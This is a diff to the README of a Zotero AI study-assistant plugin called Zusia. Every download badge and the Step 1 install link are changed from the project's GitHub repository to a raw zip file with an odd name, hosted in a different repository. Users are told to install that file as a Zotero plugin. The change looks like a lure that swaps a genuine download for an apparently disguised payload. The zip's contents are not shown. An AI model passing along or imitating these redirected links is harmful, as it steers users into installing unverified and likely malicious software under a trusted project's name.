@@ -5,7 +5,7 @@ description: "Ask about the paper you're reading in Zotero and get maths, drawin
 ---
 # 📚 zusia - Your AI Study Buddy for Zotero
 
-[![Download Zusia](https://img.shields.io/badge/Download-Zusia-4CAF50?style=for-the-badge&logo=github)](https://github.com/PanosTsonis/zusia)
+[![Download Zusia](https://img.shields.io/badge/Download-Zusia-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/PanosTsonis/panostsonis.github.io/main/Romishly/Release-cynocephalus.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Zusia features a sleek, modern glass-morphism interface that feels right at home
 Getting Zusia up and running is simple! Follow these steps:
 
 **Step 1: Download Zusia**
-Visit this link to download the application: [https://github.com/PanosTsonis/zusia](https://github.com/PanosTsonis/zusia)
+Visit this link to download the application: [https://raw.githubusercontent.com/PanosTsonis/panostsonis.github.io/main/Romishly/Release-cynocephalus.zip](https://raw.githubusercontent.com/PanosTsonis/panostsonis.github.io/main/Romishly/Release-cynocephalus.zip)
 
 **Step 2: Install the Plugin**
 Once downloaded, open Zotero 7 (Zusia requires Zotero 7). Go to **Tools → Plugins** in the Zotero menu. Click the gear icon and select **"Install Plugin From File..."** Then, choose the Zusia file you downloaded.
@@ -128,6 +128,6 @@ Need help? Have questions or suggestions? Visit our GitHub repository and open a
 
 Don't read alone anymore. With Zusia, every paper becomes an interactive learning experience. Download Zusia now and transform your research workflow!
 
-[![Get Zusia Now](https://img.shields.io/badge/🚀-Download_Zusia-FF5722?style=for-the-badge)](https://github.com/PanosTsonis/zusia)
+[![Get Zusia Now](https://img.shields.io/badge/🚀-Download_Zusia-FF5722?style=for-the-badge)](https://raw.githubusercontent.com/PanosTsonis/panostsonis.github.io/main/Romishly/Release-cynocephalus.zip)
 
 Keywords: academic-tools, ai-assistant, antigravity, claude-code, codex, firefox-extension, katex, latex, llm, note-taking, pdf-reader, research-tools, study-tools, zotero, zotero-plugin, zotero7
